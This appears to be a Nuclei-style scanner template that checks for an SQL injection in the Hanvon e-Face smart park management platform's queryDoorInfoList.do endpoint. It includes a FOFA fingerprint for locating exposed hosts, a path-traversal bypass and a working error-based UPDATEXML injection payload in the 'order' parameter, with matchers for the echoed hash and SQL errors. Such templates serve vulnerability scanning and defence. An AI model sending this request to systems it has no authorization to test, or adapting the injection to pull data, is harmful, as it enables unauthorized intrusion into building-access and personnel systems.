id: poc-yaml-hw-e-face-pass-spmp-querydoorinfolist-do-sqli
info:
  name: 汉王e脸通智慧园区管理平台 queryDoorInfoList.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: e脸通智慧园区管理平台
    fofa: icon_hash="1380907357"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /manage/dgmCommand/finishRegister.do/..;/..;/doorInfo/queryDoorInfoList.do?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x7e,(SELECT+(ELT(2920=2920,md5({{t1}})))),0x7e),8357)) HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
          - "hanvon"
          - "XPATH syntax error"
          - "java.sql.SQLException"
          - "{{t2}}"
